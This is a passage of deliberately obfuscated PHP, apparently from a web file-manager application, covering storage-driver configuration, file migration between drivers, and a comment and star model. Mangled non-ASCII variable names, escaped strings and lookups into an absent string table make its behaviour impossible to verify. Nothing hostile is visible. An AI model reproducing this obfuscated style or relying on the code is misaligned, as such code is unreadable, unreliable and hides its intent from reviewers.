$Ò¥£ÃØ» = $this->ioSizeUseGet(array_to_keyvalue($‡ûéÈ¤³, $‰ëŞ÷–[12], $‰ëŞ÷–[484])); } foreach ($‡ûéÈ¤³ as $İ¿¨ØıÛ => $ĞúßÆìÀ) { unset($‡ûéÈ¤³[$İ¿¨ØıÛ][$‰ëŞ÷–[6]]); $‡ûéÈ¤³[$İ¿¨ØıÛ][$‰ëŞ÷–[1952]] = isset($Ò¥£ÃØ»[$ĞúßÆìÀ[$‰ëŞ÷–[484]]]) ? $Ò¥£ÃØ»[$ĞúßÆìÀ[$‰ëŞ÷–[484]]] : 0; } return $‡ûéÈ¤³; } public function ioSizeUseGet($ƒ‰˜¬”) { $÷Ô íÃ =& $_SERVER[³Ôà×Ó]; if (!$ƒ‰˜¬”) { return array(); } $‚‰¿‡ß” = $÷Ô íÃ[2290] . implode($÷Ô íÃ[50], $ƒ‰˜¬”); $Î’ÂÚøÂ = Cache::get($‚‰¿‡ß”); if ($Î’ÂÚøÂ) { return $Î’ÂÚøÂ; } $Ê²¥ïûâ = array($÷Ô íÃ[892] => $÷Ô íÃ[484], $÷Ô íÃ[2291] => $÷Ô íÃ[79]); $À¹ î„‚ = array($÷Ô íÃ[892] => array($÷Ô íÃ[7], $ƒ‰˜¬”)); $Î’ÂÚøÂ = Model($÷Ô íÃ[864])->field($Ê²¥ïûâ)->where($À¹ î„‚)->group($÷Ô íÃ[892])->select(); $Î’ÂÚøÂ = array_to_keyvalue($Î’ÂÚøÂ, $÷Ô íÃ[484], $÷Ô íÃ[79]); Cache::set($‚‰¿‡ß”, $Î’ÂÚøÂ, 600); return $Î’ÂÚøÂ; } public function getConfig($í—¬Ãœ) { $Ÿì°çÕÌ = parent::listData($í—¬Ãœ); return json_decode($Ÿì°çÕÌ[$_SERVER[³Ôà×Ó][6]], !0); } public function update($ûåøàËƒ, $Şíí¹ï) { $ö…ìÜÕ =& $_SERVER[³Ôà×Ó]; $ïúáÏí‘ = $Şíí¹ï[$ö…ìÜÕ[32]]; $îøëáµÙ = array_to_keyvalue(parent::listData(), $ö…ìÜÕ[32]); if (isset($îøëáµÙ[$ïúáÏí‘]) && $îøëáµÙ[$ïúáÏí‘][$ö…ìÜÕ[484]] != $ûåøàËƒ) { return !1; } $this->checkPwd($ûåøàËƒ, $Şíí¹ï); if (isset($Şíí¹ï[$ö…ìÜÕ[2292]]) && $Şíí¹ï[$ö…ìÜÕ[2292]] == $ö…ìÜÕ[91]) { $this->checkConfig($Şíí¹ï); } unset($Şíí¹ï[$ö…ìÜÕ[2292]]); $×É² ê¯ = parent::update($ûåøàËƒ, $Şíí¹ï); if ($×É² ê¯ && $Şíí¹ï[$ö…ìÜÕ[37]]) { $ëÍÃçÍÙ = 0; foreach ($îøëáµÙ as $¶·íúóô) { if ($¶·íúóô[$ö…ìÜÕ[37]] && $¶·íúóô[$ö…ìÜÕ[484]] != $ûåøàËƒ) { $ëÍÃçÍÙ = $¶·íúóô[$ö…ìÜÕ[484]]; parent::update($¶·íúóô[$ö…ìÜÕ[484]], array($ö…ìÜÕ[37] => 0)); } } $this->updateBackup($ûåøàËƒ, $ëÍÃçÍÙ); } return $×É² ê¯; } public function add($¹ığ¹èî) { $ªÃ¦ç × =& $_SERVER[³Ôà×Ó]; $æŞ¯¿óÜ = array_to_keyvalue(parent::listData(), $ªÃ¦ç ×[32]); if (isset($æŞ¯¿óÜ[$¹ığ¹èî[$ªÃ¦ç ×[32]]])) { return !1; } $this->checkConfig($¹ığ¹èî); $«ÆßÅë¡ = parent::insert($¹ığ¹èî); if ($«ÆßÅë¡ && $¹ığ¹èî[$ªÃ¦ç ×[37]]) { foreach ($æŞ¯¿óÜ as $€ƒÏ© Ó) { if ($€ƒÏ© Ó[$ªÃ¦ç ×[37]]) { parent::update($€ƒÏ© Ó[$ªÃ¦ç ×[484]], array($ªÃ¦ç ×[37] => 0)); } } } return $«ÆßÅë¡; } public function updateBackup($±ØûÑ, $ßó×ğıĞ) { $«Š¢Ğå— =& $_SERVER[³Ôà×Ó]; if (!$ßó×ğıĞ) { return; } $úò ©Øø = Model($«Š¢Ğå—[823])->config(); if ($úò ©Øø[$«Š¢Ğå—[1735]] != $«Š¢Ğå—[91] || $úò ©Øø[$«Š¢Ğå—[827]] != $ßó×ğıĞ) { return; } $à¥Îì¨¼ = Model($«Š¢Ğå—[845])->get($«Š¢Ğå—[858]); $à¥Îì¨¼ = json_decode($à¥Îì¨¼, !0); if (!$à¥Îì¨¼) { return; } $à¥Îì¨¼[$«Š¢Ğå—[827]] = $±ØûÑ; Model($«Š¢Ğå—[845])->set(array($«Š¢Ğå—[858] => $à¥Îì¨¼)); } public function checkPwd($ùÁø¾ÈĞ, &$áª¸¥ì³) { $Ìµ¶¥…ô =& $_SERVER[³Ôà×Ó]; if (empty($áª¸¥ì³[$Ìµ¶¥…ô[6]])) { return; } $ïÜªËê€ = json_decode($áª¸¥ì³[$Ìµ¶¥…ô[6]], !0); $Ïû¥âåä = $Ìµ¶¥…ô[12]; $íŸÁØ™Š = array($Ìµ¶¥…ô[2293], $Ìµ¶¥…ô[2294], $Ìµ¶¥…ô[964]); foreach ($íŸÁØ™Š as $¸½Î”) { if (isset($ïÜªËê€[$¸½Î”])) { $Ïû¥âåä = $¸½Î”; break; } } if (!$Ïû¥âåä) { return; } $ÜÌùÉ·° = $this->getConfig($ùÁø¾ÈĞ); $¾ç¢ÎĞ„ = $ÜÌùÉ·°[$Ïû¥âåä]; $«‡ÛèîÄ = $ïÜªËê€[$Ïû¥âåä]; if ($«‡ÛèîÄ == str_repeat($Ìµ¶¥…ô[220], strlen($¾ç¢ÎĞ„))) { $ïÜªËê€[$Ïû¥âåä] = $¾ç¢ÎĞ„; $áª¸¥ì³[$Ìµ¶¥…ô[6]] = json_encode($ïÜªËê€); } else { if ($«‡ÛèîÄ != $¾ç¢ÎĞ„) { $áª¸¥ì³[$Ìµ¶¥…ô[2292]] = $Ìµ¶¥…ô[91]; } } } public function checkConfig(&$êê®Äª“, $Åšöòóã = false) { $–åÁïƒà =& $_SERVER[³Ôà×Ó]; $‡õìÇ Ø = strtolower($êê®Äª“[$–åÁïƒà[98]]); $Ù„£®¦Ê = json_decode($êê®Äª“[$–åÁïƒà[6]], !0); foreach ($Ù„£®¦Ê as $ìµÓš¹ => $»Ïä©ƒ×) { if (is_string($»Ïä©ƒ×)) { $Ù„£®¦Ê[$ìµÓš¹] = trim($»Ïä©ƒ×); } } $Ù„£®¦Ê[$–åÁïƒà[2295]] = rand_string(6); $Æ›•ˆíÇ = $GLOBALS[$–åÁïƒà[6]][$–åÁïƒà[92]][$–åÁïƒà[900]]; $üâÆÅäê = isset($Æ›•ˆíÇ[$‡õìÇ Ø]) ? $Æ›•ˆíÇ[$‡õìÇ Ø] : ucfirst($‡õìÇ Ø); $Õœ×üúš = $–åÁïƒà[77] . $üâÆÅäê; if (!$üâÆÅäê || !class_exists($Õœ×üúš)) { if ($Åšöòóã) { return LNG($–åÁïƒà[2296]); } write_log(array($–åÁïƒà[2297], $êê®Äª“, get_caller_info()), $–åÁïƒà[215]); show_json(LNG($–åÁïƒà[2296]), !1, $êê®Äª“); } $½ı®ÀÈÚ = new $Õœ×üúš($Ù„£®¦Ê); if (in_array($‡õìÇ Ø, $½ı®ÀÈÚ->objectDriver)) { try { if (!$½ı®ÀÈÚ->isBucketCors() && !$½ı®ÀÈÚ->setBucketCors()) { $ìêÎˆğ = LNG($–åÁïƒà[2298]); $ìêÎˆğ .= $–åÁïƒà[2299] . LNG($–åÁïƒà[2300]); } } catch (Exception $Í–“ĞëÀ) { $ìêÎˆğ = $Í–“ĞëÀ->getMessage(); } if (isset($ìêÎˆğ)) { return $this->_parseError($ìêÎˆğ, $‡õìÇ Ø, $Åšöòóã); } if ($‡õìÇ Ø == $–åÁïƒà[68] && !$½ı®ÀÈÚ->checkRegion()) { return $this->_parseError(LNG($–åÁïƒà[2301]), $‡õìÇ Ø, $Åšöòóã); } } $Òà§îÂ« = rtrim($Ù„£®¦Ê[$–åÁïƒà[1259]], $–åÁïƒà[8]) . $–åÁïƒà[8]; $¹Ùœ„½° = $½ı®ÀÈÚ->getPath($Òà§îÂ« . $–åÁïƒà[1263]); try { if ($‡õìÇ Ø == $–åÁïƒà[109]) { $½ı®ÀÈÚ->mkdir($Òà§îÂ«); } $¢šƒü¶‚ = $½ı®ÀÈÚ->mkfile($¹Ùœ„½°); if (!$¢šƒü¶‚) { $ìêÎˆğ = LNG($–åÁïƒà[2298]); } } catch (Exception $Í–“ĞëÀ) { $ìêÎˆğ = $Í–“ĞëÀ->getMessage(); } if (isset($ìêÎˆğ)) { return $this->_parseError($ìêÎˆğ, $‡õìÇ Ø, $Åšöòóã); } $Ù„£®¦Ê[$–åÁïƒà[1259]] = $Òà§îÂ«; $êê®Äª“[$–åÁïƒà[6]] = json_encode($Ù„£®¦Ê); $êê®Äª“[$–åÁïƒà[98]] = $üâÆÅäê; return !0; } private function _parseError($èÇ‰¯€³, $Ëé¥¨©ô, $è¦€²î = false) { $¶Şú „È =& $_SERVER[³Ôà×Ó]; if ($Ëé¥¨©ô == $¶Şú „È[68] && stripos($èÇ‰¯€³, $¶Şú „È[2302])) { $°ıŠŒäû = explode($¶Şú „È[10], $èÇ‰¯€³); $î¸ãÂ = isset($°ıŠŒäû[1]) ? $°ıŠŒäû[1] : $¶Şú „È[12]; $ºÕ¢è• = array($¶Şú „È[2303] => LNG($¶Şú „È[2304]), $¶Şú „È[2305] => LNG($¶Şú „È[2306])); if (isset($ºÕ¢è•[$î¸ãÂ])) { $èÇ‰¯€³ = $ºÕ¢è•[$î¸ãÂ]; } } if (stripos($èÇ‰¯€³, $¶Şú „È[2307]) === 0) { $«¤“åÒÌ = strpos($èÇ‰¯€³, $¶Şú „È[178]); if ($«¤“åÒÌ === !1) { $«¤“åÒÌ = strpos($èÇ‰¯€³, $¶Şú „È[4]); } if ($«¤“åÒÌ !== !1) { $èÇ‰¯€³ = substr($èÇ‰¯€³, $«¤“åÒÌ + 1); } } $èÇ‰¯€³ = LNG($¶Şú „È[1266]) . $èÇ‰¯€³; if ($è¦€²î) { return $èÇ‰¯€³; } show_json($èÇ‰¯€³, !1); } public function driverListSystem() { $ˆí²Ñ…‰ =& $_SERVER[³Ôà×Ó]; $‡êË§Ôé = parent::listData(); $¨³İå¹Ÿ = array(); foreach ($‡êË§Ôé as $¤¿Î˜“Û) { unset($¤¿Î˜“Û[$ˆí²Ñ…‰[231]], $¤¿Î˜“Û[$ˆí²Ñ…‰[88]]); $¤¿Î˜“Û[$ˆí²Ñ…‰[6]] = json_decode($¤¿Î˜“Û[$ˆí²Ñ…‰[6]], !0); $¨³İå¹Ÿ[] = $¤¿Î˜“Û; } return $¨³İå¹Ÿ; } public function defaultDriver() { $ŠòÑ»ëĞ =& $_SERVER[³Ôà×Ó]; $¸µÓÎ›Ï = parent::listData(); $¶ûäâæ‰ = array_filter_by_field($¸µÓÎ›Ï, $ŠòÑ»ëĞ[37], 1); $¶ûäâæ‰ = $¶ûäâæ‰[0]; if ($¶ûäâæ‰) { $¶ûäâæ‰[$ŠòÑ»ëĞ[6]] = json_decode($¶ûäâæ‰[$ŠòÑ»ëĞ[6]], !0); } return $¶ûäâæ‰; } public function driverInfo($ÑéïÆÖ÷) { $Íõ®âíÈ =& $_SERVER[³Ôà×Ó]; $çãŞßÂ = array_to_keyvalue(parent::listData(), $Íõ®âíÈ[484]); if (!isset($çãŞßÂ[$ÑéïÆÖ÷])) { return !1; } $éŠ¯û¿¶ = $çãŞßÂ[$ÑéïÆÖ÷]; $éŠ¯û¿¶[$Íõ®âíÈ[6]] = json_decode($éŠ¯û¿¶[$Íõ®âíÈ[6]], !0); return $éŠ¯û¿¶; } public function remove($ÀíÅèå£) { $this->removeShareItems($ÀíÅèå£); return parent::remove($ÀíÅèå£); } public function removeWithFile($Äªû·Ğá, $Û¹Âë‘¹, $©¸Ï’¾­, $ÀÁ´Úˆ = false) { $ŸºË¹›ô =& $_SERVER[³Ôà×Ó]; $ä · = array($ŸºË¹›ô[892] => $Äªû·Ğá); $Œ’¯Ô°Œ = Model($ŸºË¹›ô[553])->where($ä ·)->count(); $“§¾Ï¨§ = Model($ŸºË¹›ô[553])->where($ä ·)->sum($ŸºË¹›ô[79]); $¦Ùë¿é = $Û¹Âë‘¹ . $ŸºË¹›ô[2308] . $Äªû·Ğá; $º¥¡¥ÌŞ = LNG($Û¹Âë‘¹ == $ŸºË¹›ô[629] ? $ŸºË¹›ô[2309] : $ŸºË¹›ô[2310]); $çú•‚İ´ = new TaskFileTransfer($¦Ùë¿é, $ŸºË¹›ô[215], $Œ’¯Ô°Œ, $º¥¡¥ÌŞ . $ŸºË¹›ô[471] . $©¸Ï’¾­[$ŸºË¹›ô[32]] . $ŸºË¹›ô[214] . $Äªû·Ğá); $çú•‚İ´->task[$ŸºË¹›ô[838]] = (double) $“§¾Ï¨§; $§˜¬â±Š = KodIO::defaultDriver(); $èó–ÄŞ = $§˜¬â±Š[$ŸºË¹›ô[484]]; $ôî„¹Œ = $ÏÛÙ“óå = $ºùûö®ç = array(); $ì†­©Ö• = Model($ŸºË¹›ô[230])->where($ä ·)->field($ŸºË¹›ô[2311])->select(); foreach ($ì†­©Ö• as $÷À½Å‹İ) { $˜ÚãÙ™ = $÷À½Å‹İ[$ŸºË¹›ô[550]]; if ($ÀÁ´Úˆ) { $ÏÛÙ“óå[] = $˜ÚãÙ™; continue; } $¢²Û“—î = $÷À½Å‹İ[$ŸºË¹›ô[87]]; $è’”ÀîÁ = get_path_father($¢²Û“—î); $ºùûö®ç[] = $è’”ÀîÁ; $è’”ÀîÁ = str_replace("\173\151\157\72{$Äªû·Ğá}\175\57", "\x7b\151\x6f\x3a{$èó–ÄŞ}\175\57", $è’”ÀîÁ); if (!IO::exist($¢²Û“—î)) { $ôî„¹Œ[] = $˜ÚãÙ™; $çú•‚İ´->updateFileEnd($÷À½Å‹İ[$ŸºË¹›ô[32]], $÷À½Å‹İ[$ŸºË¹›ô[79]]); write_log($ŸºË¹›ô[2312] . $¢²Û“—î, $ŸºË¹›ô[1895]); continue; } $ğÕÂŠï¬ = IO::move($¢²Û“—î, $è’”ÀîÁ, REPEAT_RENAME); if (!$ğÕÂŠï¬) { $ÏÛÙ“óå[] = $˜ÚãÙ™; $çú•‚İ´->updateFileEnd($÷À½Å‹İ[$ŸºË¹›ô[32]], $÷À½Å‹İ[$ŸºË¹›ô[79]]); write_log($ŸºË¹›ô[2313] . $¢²Û“—î, $ŸºË¹›ô[1895]); continue; } $ä · = array($ŸºË¹›ô[550] => $˜ÚãÙ™); $§¥ÙËù´ = array($ŸºË¹›ô[892] => $èó–ÄŞ, $ŸºË¹›ô[87] => $ğÕÂŠï¬); Model($ŸºË¹›ô[230])->where($ä ·)->save($§¥ÙËù´); } $´óÏÁú† = $çú•‚İ´->task; if (!$ÀÁ´Úˆ) { Cache::set($¦Ùë¿é, $´óÏÁú†); } $çú•‚İ´->end(); $ôî„¹Œ = array_unique($ôî„¹Œ); $ÏÛÙ“óå = array_unique($ÏÛÙ“óå); if (!$ÀÁ´Úˆ && ($ôî„¹Œ || $ÏÛÙ“óå)) { $ÑõÁ¥‚ˆ = array(); if ($ôî„¹Œ) { $ÑõÁ¥‚ˆ[] = sprintf(LNG($ŸºË¹›ô[2314]), count($ôî„¹Œ)); } if ($ÏÛÙ“óå) { $ÑõÁ¥‚ˆ[] = sprintf(LNG($ŸºË¹›ô[2315]), count($ÏÛÙ“óå)); } $ÑõÁ¥‚ˆ = sprintf(LNG($ŸºË¹›ô[2316]), implode($ŸºË¹›ô[2317], $ÑõÁ¥‚ˆ)) . $ŸºË¹›ô[2318] . date($ŸºË¹›ô[2319]) . $ŸºË¹›ô[2320]; if ($Û¹Âë‘¹ == $ŸºË¹›ô[1932]) { $ÑõÁ¥‚ˆ .= $ŸºË¹›ô[2321] . LNG($ŸºË¹›ô[2322]); } $´óÏÁú†[$ŸºË¹›ô[1261]] = $ÑõÁ¥‚ˆ; Cache::set($¦Ùë¿é, $´óÏÁú†); unset($©¸Ï’¾­[$ŸºË¹›ô[6]]); $ÖÄÛºßï = array($ŸºË¹›ô[484] => $Äªû·Ğá, $ŸºË¹›ô[2201] => $ŸºË¹›ô[629], $ŸºË¹›ô[32] => $©¸Ï’¾­[$ŸºË¹›ô[32]], $ŸºË¹›ô[1284] => $©¸Ï’¾­); Hook::trigger($ŸºË¹›ô[1776], array($ŸºË¹›ô[1284] => $ÖÄÛºßï, $ŸºË¹›ô[1294] => !0)); show_json($ÑõÁ¥‚ˆ, !1, 100111); } if ($Û¹Âë‘¹ == $ŸºË¹›ô[629]) { return !0; } if ($ôî„¹Œ || $ÏÛÙ“óå) { $ØÅ¸é“† = array_merge($ôî„¹Œ, $ÏÛÙ“óå); $ØÅ¸é“† = array_filter(array_unique($ØÅ¸é“†)); $this->removeByFileID($ØÅ¸é“†); } if ($ºùûö®ç) { $ºùûö®ç = array_filter(array_unique($ºùûö®ç)); foreach ($ºùûö®ç as $¢²Û“—î) { $¬ØÖÔà™ = IO::has($¢²Û“—î, !0); if (!$¬ØÖÔà™[$ŸºË¹›ô[239]] && !$¬ØÖÔà™[$ŸºË¹›ô[240]]) { IO::remove($¢²Û“—î); } } } return $this->remove($Äªû·Ğá); } private function removeByFileID($ …¬½É¥ = array()) { $¨©Ì‹ˆ¥ =& $_SERVER[³Ôà×Ó]; if (empty($ …¬½É¥)) { return; } $€°”é¥· = array($¨©Ì‹ˆ¥[550] => array($¨©Ì‹ˆ¥[7], $ …¬½É¥)); $—˜úàÜ = Model($¨©Ì‹ˆ¥[1414])->where($€°”é¥·)->field($¨©Ì‹ˆ¥[193])->select(); if (!$—˜úàÜ) { return Model($¨©Ì‹ˆ¥[553])->remove($ …¬½É¥); } $—˜úàÜ = array_to_keyvalue($—˜úàÜ, $¨©Ì‹ˆ¥[12], $¨©Ì‹ˆ¥[193]); foreach ($—˜úàÜ as $Â…åòí±) { Model($¨©Ì‹ˆ¥[899])->removeNow($Â…åòí±, !1); } } private function removeShareItems($ÆÚ¸üĞ) { $™¨ßœá° =& $_SERVER[³Ôà×Ó]; $¿Ñ«”†± = "\x7b\151\157\72{$ÆÚ¸üĞ}\x7d\57"; $¢Şáİì = array($™¨ßœá°[193] => 0, $™¨ßœá°[1254] => array($™¨ßœá°[468], "{$¿Ñ«”†±}\45")); $›ì×¹¼ = Model($™¨ßœá°[1943])->where($¢Şáİì)->field($™¨ßœá°[674])->select(); if (empty($›ì×¹¼)) { return; } $úß³‘Ÿ = array_to_keyvalue($›ì×¹¼, $™¨ßœá°[12], $™¨ßœá°[674]); Model($™¨ßœá°[673])->remove($úß³‘Ÿ); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\114\151\x67\x68\x74\x41\x70\160"; public $modelType = "\123\x79\x73\x74\x65\x6d\117\160\x74\x69\157\x6e"; public $field = array("\156\141\155\145", "\147\162\x6f\165\160", "\x64\145\163\x63", "\143\x6f\x6e\164\x65\x6e\x74"); public function listData($°ğ«÷×µ = false, $üĞÍêº™ = "\x6d\157\144\x69\146\x79\x54\151\x6d\x65", $Ìè»ü–Æ = true) { return parent::listData($°ğ«÷×µ, $üĞÍêº™, $Ìè»ü–Æ); } public function remove($ÇæÁÄĞÚ) { $«ÔÎîş = $this->findByName($ÇæÁÄĞÚ); if (!$«ÔÎîş) { return !1; } return parent::remove($«ÔÎîş[$_SERVER[³Ôà×Ó][484]]); } public function add($ˆ…÷·¿Õ) { if ($this->findByName($ˆ…÷·¿Õ[$_SERVER[³Ôà×Ó][32]])) { return !1; } return parent::insert($ˆ…÷·¿Õ); } public function update($àê†É•¬, $ç²È“Á) { $‰æ·ˆò¬ =& $_SERVER[³Ôà×Ó]; $Ó¶„ö¤¤ = $this->findByName($àê†É•¬); $Â£ÜÇ¶‘ = $this->findByName($ç²È“Á[$‰æ·ˆò¬[32]]); if (!$Ó¶„ö¤¤ || $Â£ÜÇ¶‘ && $Â£ÜÇ¶‘[$‰æ·ˆò¬[484]] != $Ó¶„ö¤¤[$‰æ·ˆò¬[484]]) { return !1; } return parent::update($Ó¶„ö¤¤[$‰æ·ˆò¬[484]], $ç²È“Á); } } goto b…£…î­; Aç‹Œì×ìæ: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\x6d\x65\156\164"; protected $tableMeta = array("\164\x61\x62\x6c\x65\116\141\155\x65" => "\143\157\155\x6d\x65\x6e\x74\x5f\x6d\145\164\141", "\155\145\x74\x61\x46\x69\x65\x6c\144" => "\x63\x6f\x6d\x6d\x65\156\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ğğİ€ôø) { $›é‘í€‹ =& $_SERVER[³Ôà×Ó]; if ($ğğİ€ôø[$›é‘í€‹[1992]]) { $Ñ¸’ŒØÖ = $this->where(array($›é‘í€‹[1993] => $ğğİ€ôø[$›é‘í€‹[1992]]))->find(); if (!$Ñ¸’ŒØÖ || $Ñ¸’ŒØÖ[$›é‘í€‹[190]] != $ğğİ€ôø[$›é‘í€‹[190]] || $Ñ¸’ŒØÖ[$›é‘í€‹[578]] != $ğğİ€ôø[$›é‘í€‹[578]]) { return !1; } $this->where(array($›é‘í€‹[1993] => $ğğİ€ôø[$›é‘í€‹[1992]]))->setAdd($›é‘í€‹[1994], 1); } $ğğİ€ôø[$›é‘í€‹[1995]] = 0; $ğğİ€ôø[$›é‘í€‹[1994]] = 0; $ğğİ€ôø[$›é‘í€‹[825]] = 1; return $this->add($ğğİ€ôø); } public function commentCount($éÁÛ±³«, $¤”€õ÷ï, $¸†¬Ì¥¼ = false) { $ø«à‡î¼ =& $_SERVER[³Ôà×Ó]; if (!$éÁÛ±³«) { return array(); } if (is_string($éÁÛ±³«) || is_int($éÁÛ±³«)) { $éÁÛ±³« = array($éÁÛ±³«); } $¹½¬“Úü = array($ø«à‡î¼[578], $ø«à‡î¼[1996] => $ø«à‡î¼[574]); $ù»ğ¡ÃÏ = array($ø«à‡î¼[578] => array($ø«à‡î¼[7], $éÁÛ±³«), $ø«à‡î¼[190] => $¤”€õ÷ï); if ($¸†¬Ì¥¼) { $ù»ğ¡ÃÏ[$ø«à‡î¼[1765]] = $¸†¬Ì¥¼; } $ëÅ¶é = $this->field($¹½¬“Úü)->where($ù»ğ¡ÃÏ)->group($ø«à‡î¼[578])->select(); return array_to_keyvalue($ëÅ¶é, $ø«à‡î¼[578], $ø«à‡î¼[574]); } public function starTarget($ˆüÑÓÅ¹, $ÃÑ¤Ë‚Ó) { $ÖŒÕ¾ì¨ =& $_SERVER[³Ôà×Ó]; $¼—ğ§Ò¾ = $ˆüÑÓÅ¹ + self::TYPE_STAR_OFFSET; $ñÕ¿”‡ = array($ÖŒÕ¾ì¨[1765] => USER_ID, $ÖŒÕ¾ì¨[190] => $¼—ğ§Ò¾, $ÖŒÕ¾ì¨[578] => $ÃÑ¤Ë‚Ó); $‰«³ = $this->where($ñÕ¿”‡)->find(); if ($‰«³) { return $this->where(array($ÖŒÕ¾ì¨[484] => $‰«³[$ÖŒÕ¾ì¨[484]]))->delete(); } $’ÉæöìŒ = array($ÖŒÕ¾ì¨[1992] => 0, $ÖŒÕ¾ì¨[1765] => USER_ID, $ÖŒÕ¾ì¨[825] => 1, $ÖŒÕ¾ì¨[171] => $ÖŒÕ¾ì¨[12], $ÖŒÕ¾ì¨[190] => $¼—ğ§Ò¾, $ÖŒÕ¾ì¨[578] => $ÃÑ¤Ë‚Ó, $ÖŒÕ¾ì¨[1995] => 0, $ÖŒÕ¾ì¨[1994] => 0); return $this->add($’ÉæöìŒ); } public function starTargetCount($Íé…”‹ó, $†ïÔÂƒ) { $Ø”µù§ =& $_SERVER[³Ôà×Ó]; $¯Ü•¤îÄ = $†ïÔÂƒ + self::TYPE_STAR_OFFSET; $ûºÅŸÏã = $this->commentCount($Íé…”‹ó, $¯Ü•¤îÄ); $¬×ßò¼ = $this->commentCount($Íé…”‹ó, $¯Ü•¤îÄ, USER_ID); return array($Ø”µù§[1997] => $ûºÅŸÏã, $Ø”µù§[1998] => $¬×ßò¼); } public function starTargetUserList($æÏÃ‹É, $Ğê¤ÔèÈ) { $ì¥Èóå =& $_SERVER[³Ôà×Ó]; $Å™Ô¿¤ê = $æÏÃ‹É + self::TYPE_STAR_OFFSET; $†€—Šöˆ = array($ì¥Èóå[578] => $Ğê¤ÔèÈ, $ì¥Èóå[190] => $Å™Ô¿¤ê); $´ï¥¥ù˜ = $this->where($†€—Šöˆ)->count(); $éù®‡¿­ = array($ì¥Èóå[332] => $´ï¥¥ù˜, $ì¥Èóå[1999] => array()); if (!$´ï¥¥ù˜) { return $éù®‡¿­; } $²Ö¦ñ³Ó = $this->field($ì¥Èóå[1765])->where($†€—Šöˆ)->limit(500)->select(); $²Ö¦ñ³Ó = array_to_keyvalue($²Ö¦ñ³Ó, $ì¥Èóå[12], $ì¥Èóå[1765]); $éù®‡¿­[$ì¥Èóå[1999]] = Model($ì¥Èóå[586])->userListInfo($²Ö¦ñ³Ó); return $éù®‡¿­; } public function prasiseUserList($ı»Å¤ÊÆ) { $´•ÚÖó =& $_SERVER[³Ôà×Ó]; $ıîÈÄî = array($´•ÚÖó[2000] => $ı»Å¤ÊÆ); $µÑ¥Ãòæ = $this->where($ıîÈÄî)->find(); $Ğ„‹„İş = _get($µÑ¥Ãòæ, $´•ÚÖó[1995], 0); $ÙÏ­ú½Ì = array($´•ÚÖó[332] => $Ğ„‹„İş, $´•ÚÖó[1999] => array()); if (!$Ğ„‹„İş) { return $ÙÏ­ú½Ì; } $ëæÂêÉÍ = Model($´•ÚÖó[2001])->field($´•ÚÖó[1765])->where($ıîÈÄî)->limit(500)->select(); $ëæÂêÉÍ = array_to_keyvalue($ëæÂêÉÍ, $´•ÚÖó[12], $´•ÚÖó[1765]); $ÙÏ­ú½Ì[$´•ÚÖó[1999]] = Model($´•ÚÖó[586])->userListInfo($ëæÂêÉÍ); return $ÙÏ­ú½Ì; } public function remove($œ™Òó´£) { $å¡½ş›… =& $_SERVER[³Ôà×Ó]; $ÖıùğŒ„ = array($å¡½ş›…[1993] => $œ™Òó´£); $—Ğ´‰¡¿ = $this->where($ÖıùğŒ„)->find(); if ($—Ğ´‰¡¿[$å¡½ş›…[1992]]) { $this->where(array($å¡½ş›…[1993] => $—Ğ´‰¡¿[$å¡½ş›…[1992]]))->setAdd($å¡½ş›…[1994], -1); } return $this->where($ÖıùğŒ„)->delete(); } public function edit($ÂÅæâëµ, $´Ú ×±) { $ˆ«Ä¯±¸ =& $_SERVER[³Ôà×Ó]; $íÖßñÂá = array($ˆ«Ä¯±¸[1993] => $ÂÅæâëµ); return $this->where($íÖßñÂá)->save(array($ˆ«Ä¯±¸[2002] => $´Ú ×±)); } public function prasise($áÍßêºË) { $³ØàÚ’ =& $_SERVER[³Ôà×Ó]; $×±Éãè¼ = Model($³ØàÚ’[2003]); $áÍÎò‰Š = array($³ØàÚ’[1993] => $áÍßêºË, $³ØàÚ’[1756] => USER_ID); $ÇƒÁäÉ³ = $×±Éãè¼->where($áÍÎò‰Š)->find(); if (!$ÇƒÁäÉ³) { $×±Éãè¼->add($áÍÎò‰Š); $ ñŸôøü = $this->where(array($³ØàÚ’[1993] => $áÍßêºË))->setAdd($³ØàÚ’[1995], 1); } else { $×±Éãè¼->where($áÍÎò‰Š)->delete(); $ ñŸôøü = $this->where(array($³ØàÚ’[1993] => $áÍßêºË))->setAdd($³ØàÚ’[1995], -1); } return $ ñŸôøü; } public function targetInfo($¹ŸºÜŸ, $‚ÏíÄˆş) { $…ö„“æ· =& $_SERVER[³Ôà×Ó]; $ø¦Œ = array($…ö„“æ·[657] => $¹ŸºÜŸ, $…ö„“æ·[658] => $‚ÏíÄˆş); $‘ãòù”Ò = $this->where($ø¦Œ)->count(); $şøò„ñÜ = "\122\x49\x47\110\124\40\112\x4f\x49\116\x20{$this->tablePrefix}\143\x6f\x6d\x6d\x65\x6e\x74\x5f\x70\x72\x61\151\163\145\40\x73\164\x61\x72\x20\157\156\40\x63\x6f\x6d\155\145\x6e\x74\56\x63\157\x6d\155\145\x6e\164\x49\104\x20\x3d\x20\x73\164\141\x72\56\143\157\155\155\x65\156\164\111\x44"; $£ÁŒ—³ = $this->alias($…ö„“æ·[430])->where($ø¦Œ)->join($şøò„ñÜ, $…ö„“æ·[2004])->count(); $ª½‰Êæí = array($…ö„“æ·[2005] => $‘ãòù”Ò, $…ö„“æ·[2006] => $£ÁŒ—³); return $ª½‰Êæí; } public function listData($ş¡®ş¶ì) { $Ü¶§î‡© =& $_SERVER[³Ôà×Ó]; if (isset($ş¡®ş¶ì[$Ü¶§î‡©[2007]])) { if ($ş¡®ş¶ì[$Ü¶§î‡©[2007]]) { $ş¡®ş¶ì[$Ü¶§î‡©[2000]] = array($Ü¶§î‡©[1089], intval($ş¡®ş¶ì[$Ü¶§î‡©[2007]])); } unset($ş¡®ş¶ì[$Ü¶§î‡©[2007]]); } if (isset($ş¡®ş¶ì[$Ü¶§î‡©[2008]])) { if ($ş¡®ş¶ì[$Ü¶§î‡©[2008]]) { $ş¡®ş¶ì[$Ü¶§î‡©[2000]] = array($Ü¶§î‡©[1086], intval($ş¡®ş¶ì[$Ü¶§î‡©[2008]])); } unset($ş¡®ş¶ì[$Ü¶§î‡©[2008]]); } return 